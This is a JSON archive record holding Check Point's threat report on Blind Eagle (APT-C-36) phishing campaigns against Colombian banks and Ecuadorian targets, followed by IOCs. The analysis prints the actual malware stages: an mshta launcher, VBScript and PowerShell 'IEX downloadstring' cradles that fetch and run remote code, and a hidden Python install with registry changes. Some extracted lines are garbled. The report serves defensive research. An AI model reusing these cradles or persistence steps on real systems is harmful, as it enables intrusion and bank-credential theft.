{
    "id": "1d58c0d1-b6f9-4e34-87c0-00acc4013e9a",
    "created_at": "2023-03-14T02:08:47.622174Z",
    "updated_at": "2025-03-27T02:16:09.277343Z",
    "deleted_at": null,
    "sha1_hash": "3a904da819b8adb107998f6408249cf29ce950cb",
    "title": "BlindEagle Targeting Ecuador With Sharpened Tools",
    "authors": "checkpoint",
    "file_creation_date": "2023-03-13T13:55:20Z",
    "file_modification_date": "2023-03-13T13:55:20Z",
    "file_size": 776617,
    "plain_text": "# BlindEagle Targeting Ecuador With Sharpened Tools\n\n**research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools**\n\n**Research by: Marc Salinas Fernandez.**\n\n## HIGHLIGHTS:\n\n\nJanuary 5, 2023\n\n\n_APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against_\n_citizens of various countries in South America since at least 2018._\n_In a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced_\n_toolset._\n_The backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this group_\n\n## ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS\n\nFor the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs\ndescribed above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the\nMinistry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.\n\nSuch emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included\nboth a link and a terse attached PDF directing the unfortunate victim to the exact same link.\n\nIn both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate\nwith a different “server” depending on the original country ( https://gtly[.]to/QvlFV_zgh ). If the incoming HTTP request originates from\noutside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration\ndepartment of the Colombian Ministry of Foreign Affairs.\n\nIf the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file\nfor download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the\n[LHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password](https://en.wikipedia.org/wiki/LHA_(file_format))\nis found both in the email and in the attached PDF.\n\n\n-----\n\nThe malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.\n\nQuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group\nhave added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This\nprocess, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not\n[without precedent in the security landscape and always makes us heave a sad sigh when we encounter it.](https://research.checkpoint.com/2020/gozi-the-malware-with-a-thousand-faces/)\n\nAlthough QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in\nthe campaign was to intercept victim access to their bank account.\n\nThis is a complete list of targeted entities:\n\nBancolombia Sucursal Virtual Personas\n\nSucursal_Virtual_Empresas_\n\nPortal Empresarial Davivienda\n\nBBVA Net Cash\n\nColpatria – Banca Empresas\n\nbancaempresas.bancocajasocial.com\n\nEmpresarial Banco de Bogota\n\nconexionenlinea.bancodebogota.com\n\nAV Villas – Banca Empresarial\n\nBancoomeva Banca Empresarial\n\nTRANSUNION\n\nBanco Popular\n\nportalpymes\n\nBlockchain\n\nDashboardDavivienda\n\nSome extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate\nthe system Proxy:\n\n\n-----\n\nAlong with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter\norder:\n\n## A BETTER CAMPAIGN FEATURING NEWER TOOLS\n\nOne specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle\nattacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign\nredirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:\n\n\n-----\n\nIf contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single\nexecutable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:\n\nInside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage\nin the infection chain:\n\nimport os\n\nimport subprocess\n\nimport ctypes\n\nctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)\n\nwsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'\n\nos.system(wsx)\n```\nmshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which\n\n```\ncontains VBS code embedded in an HTML.\n\n<script language=\"VBScript\">\n\nCreateObject(\"Wscript.Shell\").run\"powershell.exe -noexit \"\"$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious\ndomain]/wins''))';$a3=\"\"$a1,$a2\"\";IEX(-join $a3)\"\"\", 0, true\n\nself.close\n\n</script>\n\nUsually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case\nis different, and the next stage is hosted at the malicious domain upxsystems[.]com.\n\nThis next-stage downloads and executes yet another next-stage, a script written in Powershell:\n\nfunction StartA{\n\n[version]$OSVersion = [Environment]::OSVersion.Version\n\nIf ($OSVersion -gt \"10.0\") {\n\niex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w10/0\")\n\n} ElseIf ($OSVersion -gt \"6.3\") {\n\niex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w8/0\")\n\n} ElseIf ($OSVersion -gt \"6.2\") {\n\niex (new-object net.webclient).downloadstring(\"https://[malicious domain]/covidV22/ini/w8/0\")\n\n\n-----\n\n} se ($OSVe s o gt 6. ) {\n\niex (new-object net.webclient).downloadstring(\"http://[malicious domain]/covidV22/ini/w7/0\")\n\n}\n\n}\n\nStartA\n\nThe above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell\nchecks for installed AV tools and behaves differently based on its findings.\n\nThe main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example\nWindows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version\nof python suitable for the target OS and install it:\n\nFunction PY(){\n\nif([System.IntPtr]::Size -eq 4)\n\n{\n\n$progressPreference = 'silentlyContinue'\n\n$url = \"<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>\"\n\n$output = \"$env:PUBLIC\\\\py.zip\"\n\n$start_time = Get-Date\n\n$wc = New-Object System.Net.WebClient\n\n$wc.DownloadFile($url, $output)\n\nNew-Item \"$env:PUBLIC\\\\py\" -type directory\n\n$FILE=Get-Item \"$env:PUBLIC\\\\py\" -Force\n\n$FILE.attributes='Hidden'\n\n$shell = New-Object -ComObject Shell.Application\n\n$zip = $shell.Namespace(\"$env:PUBLIC\\\\py.zip\")\n\n$items = $zip.items()\n\n$shell.Namespace(\"$env:PUBLIC\\\\py\").CopyHere($items, 1556)\n\nstart-sleep -Seconds 2;\n\nRemove-Item \"$env:PUBLIC\\\\py.zip\"\n\nRemove-Item \"$env:USERPROFILE\\\\PUBLIC\\\\Local\\\\Microsoft\\\\WindowsApps\\\\*.*\" -Recurse -Force\n\nRemove-Item \"$env:USERPROFILE\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\*.*\" -Recurse -Force\n\nsetx PATH \"$env:path;$env:PUBLIC\\\\py\"\n\nNew-Item -Path HKCU:\\\\Software\\\\Classes\\\\Applications\\\\python.exe\\\\shell\\\\open\\\\command\\\\ -Value\n\"\"\"$env:PUBLIC\\\\py\\\\python.exe\"\" \"\"%1\"\"\" -Force\n\nSet-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name\n\"$env:PUBLIC\\\\py\\\\python.exe.ApplicationCompany\" -value \"Python Software Foundation\"\n\nSet-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name\n\"$env:PUBLIC\\\\py\\\\python.exe.FriendlyAppName\" -value \"Python\"\n\n}\n\n....\n\n\n-----\n\nt w t e dow oad two sc pts a ed `p py a d` `y` `py w` c w be sto ed t e use `% ub` `c%` o de a d o w c t w c eate\na scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2\n“upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”.\n\nIn the case of Windows 7, the task is preconfigured to be executed as System and contains the following description\n\n_<Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá_\n_actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no_\n_anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description>_\n\nIt’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es\n_posible que algunas funciones no anden” instead of “no se ejecuten” or any other variation more common in different geographic regions._\n\nThe full description can be translated to:\n\n“Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means\n_that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no_\n_Google software uses it.”_\n\nAfter downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.\n\nRegarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never,\never, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”):\n\nAfter deciphering these strings for each script we obtain two different types of Meterpreter samples.\n\n## ByAV2.py\n\nThis code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses\n“tcp://systemwin.linkpc[.]net:443” as a C2 server.\n\nPython has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware\nauthors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the\nkey is used as the seed to prime the `random library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers`\nusing a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.\n\n\n-----\n\n## mp.py\n\n[The second script basically consists of another sample of Meterpreter — this time a version developed entirely in Python and using the same C2](https://github.com/rapid7/metasploit-payloads/blob/master/python/meterpreter/meterpreter.py)\nserver. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different\nlanguage; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.\n\n## CONCLUSION\n\nBlind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and\nmonetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very\nnarrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last\nfew years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate\ninfection chains and “Living off the Land” as seen with the clever abuse of `mshta . If what we’ve seen is any indication, this group is worth`\nkeeping an eye on so that victims aren’t blindsided by whatever clever thing they try next.\n\n[Check Point’s anti-phishing solutions for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between](https://www.checkpoint.com/harmony/anti-phishing/)\nthe sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and\n[Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing](https://www.checkpoint.com/harmony/email-security/email-office/)\nattacks.\n\n## IOCs\n\n\n-----\n\n8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564\n\n2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001\n\nf80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64\n\n68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e\n\n61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4\n\nhttps://www.mediafire[.]com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file\n\nhttps://gtly[.]to/QvlFV_zgh\n\nhttps://gtly[.]to/cuOv3gNDi\n\nhttps://gtly[.]to/dGBeBqd8z\n\nlaminascol[.]linkpc[.]net\n\nsystemwin[.]linkpc[.]net\n\nupxsystems[.]com\n\nc63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf\n\n353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e\n\na03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e\n\n46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12\n\nc067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59\n\n10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d\n\nc4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12\n\nac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716\n\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/02999kyg7rhnghwp8v7g1zp8njpmslu3"
    ],
    "report_names": [
        "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)"
    ],
    "threat_actors": [
        {
            "id": "98b22fd7-bf1b-41a6-b51c-0e33a0ffd813",
            "created_at": "2022-10-25T15:50:23.688973Z",
            "updated_at": "2025-03-27T02:00:55.524322Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "APT-C-36",
                "Blind Eagle"
            ],
            "source_name": "MITRE:APT-C-36",
            "tools": [
                "Imminent Monitor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bd43391b-b835-4cb3-839a-d830aa1a3410",
            "created_at": "2023-01-06T13:46:38.925525Z",
            "updated_at": "2025-03-27T02:00:02.95302Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "Blind Eagle"
            ],
            "source_name": "MISPGALAXY:APT-C-36",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "be597b07-0cde-47bc-80c3-790a8df34af4",
            "created_at": "2022-10-25T16:07:23.407484Z",
            "updated_at": "2025-03-27T02:02:09.784411Z",
            "deleted_at": null,
            "main_name": "Blind Eagle",
            "aliases": [
                "APT-C-36",
                "APT-Q-98",
                "AguilaCiega"
            ],
            "source_name": "ETDA:Blind Eagle",
            "tools": [
                "AsyncRAT",
                "BitRAT",
                "Bladabindi",
                "BlotchyQuasar",
                "Imminent Monitor",
                "Imminent Monitor RAT",
                "Jorik",
                "LimeRAT",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Socmer",
                "Warzone",
                "Warzone RAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1678759727,
    "ts_updated_at": 1743041769,
    "ts_creation_date": 1678715720,
    "ts_modification_date": 1678715720,
    "files": {
        "pdf": "https://archive.orkl.eu/3a904da819b8adb107998f6408249cf29ce950cb.pdf",
        "text": "https://archive.orkl.eu/3a904da819b8adb107998f6408249cf29ce950cb.txt",
        "img": "https://archive.orkl.eu/3a904da819b8adb107998f6408249cf29ce950cb.jpg"
    }
}